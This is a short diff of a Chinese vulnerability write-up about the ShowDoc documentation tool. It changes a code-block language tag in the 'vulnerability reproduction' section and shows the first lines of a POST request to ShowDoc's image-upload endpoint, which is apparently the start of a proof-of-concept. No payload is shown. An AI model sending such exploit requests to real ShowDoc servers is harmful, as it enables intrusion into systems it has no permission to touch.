@@ -47,7 +47,7 @@ ShowDoc是一个非常适合IT团队的在线文档分享工具，它可以加�
 
 
 # 四、漏洞复现
-```rust
+```http
 POST /index.php?s=/home/page/uploadImg HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
